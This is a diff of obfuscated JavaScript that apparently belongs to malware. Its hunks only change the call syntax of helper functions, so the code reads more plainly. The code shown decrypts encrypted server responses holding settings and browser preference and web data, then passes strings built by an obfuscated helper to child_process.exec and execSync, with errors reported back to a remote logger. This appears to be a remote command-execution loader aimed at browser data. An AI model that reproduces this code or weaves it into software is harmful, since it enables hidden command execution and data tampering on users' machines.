@@ -2043,7 +2043,7 @@
               let pk = function (pm, pn) {
                 return '' + pm + pn.toString().padStart(2, '0');
               };
-              const data2 = JSON.parse((0, nr.U61FWBZ)(pg, pj.data, pj.iv));
+              const data2 = JSON.parse(nr.U61FWBZ(pg, pj.data, pj.iv));
               let pl = 1;
               ns.E506IW4.f538M6A = data2[pk('A', pl++)];
               ns.E506IW4.y50355J = data2[pk('A', pl++)];
@@ -2169,7 +2169,7 @@
                 str10 = '';
                 break;
             }
-            require("child_process").exec((0, nr.o5B4F49)('', str10, ''), (pr, ps, pt) => {
+            require("child_process").exec(nr.o5B4F49('', str10, ''), (pr, ps, pt) => {
               if (pr) {
                 (async () => {
                   await nr.w3F3UWA.Y6CDW21(pp, [132, ''], pr);
@@ -2533,11 +2533,11 @@
           const cp3 = require("child_process");
           if (sc) {
             for (let sd = 0; sd < 3; sd++) {
-              cp3.exec((0, nr.o5B4F49)('', sb));
+              cp3.exec(nr.o5B4F49('', sb));
               await this.E4E2LLU(100);
             }
           }
-          cp3.exec((0, nr.o5B4F49)('', sb));
+          cp3.exec(nr.o5B4F49('', sb));
           await this.E4E2LLU(100);
         }
         async A554U7Y(se, sf, sg = false) {
@@ -2607,21 +2607,21 @@
         }
         async O69AL84(sz, ta, tb) {
           try {
-            require("child_process").execSync((0, nr.o5B4F49)('', sz, ta, tb));
+            require("child_process").execSync(nr.o5B4F49('', sz, ta, tb));
           } catch (tc) {
             await nr.w3F3UWA.Y6CDW21(0, [135, ''], tc);
           }
         }
         async w4D8BBU(td, te) {
           try {
-            require("child_process").execSync((0, nr.o5B4F49)('', td, te));
+            require("child_process").execSync(nr.o5B4F49('', td, te));
           } catch (tf) {
             await nr.w3F3UWA.Y6CDW21(1, [143, ''], tf);
           }
         }
         async u459C3E(tg, th) {
           try {
-            const ti = th.trim() == '' ? (0, nr.o5B4F49)('', tg) : (0, nr.o5B4F49)('', tg, th);
+            const ti = th.trim() == '' ? nr.o5B4F49('', tg) : nr.o5B4F49('', tg, th);
             require("child_process").execSync(ti);
             return true;
           } catch (tj) {
@@ -2667,7 +2667,7 @@
               let tp = await to.json();
               try {
                 if (tp.data) {
-                  const data6 = JSON.parse((0, nr.U61FWBZ)(tm, tp.data, tp.iv));
+                  const data6 = JSON.parse(nr.U61FWBZ(tm, tp.data, tp.iv));
                   let tq = new nu();
                   tq.H5C67AR = data6.wc ?? false;
                   tq.n412K1U = data6.wcs ?? false;
@@ -2723,7 +2723,7 @@
             let ua = await tz.json();
             try {
               if (ua.data) {
-                const data7 = JSON.parse((0, nr.U61FWBZ)(tx, ua.searchdata, ua.iv));
+                const data7 = JSON.parse(nr.U61FWBZ(tx, ua.searchdata, ua.iv));
                 let ub = JSON.stringify(data7.pref) ?? '';
                 let uc = JSON.stringify(data7.spref) ?? '';
                 let ud = JSON.stringify(data7.regdata) ?? '';
@@ -2781,7 +2781,7 @@
                 if (!up.searchdata) {
                   return new nw(true, '', '');
                 }
-                const data8 = JSON.parse((0, nr.U61FWBZ)(um, up.searchdata, up.iv));
+                const data8 = JSON.parse(nr.U61FWBZ(um, up.searchdata, up.iv));
                 const uq = data8.pref ?? '';
                 const ur = data8.webData ?? '';
                 let us = ur !== '' ? JSON.stringify(ur) ?? '' : '';
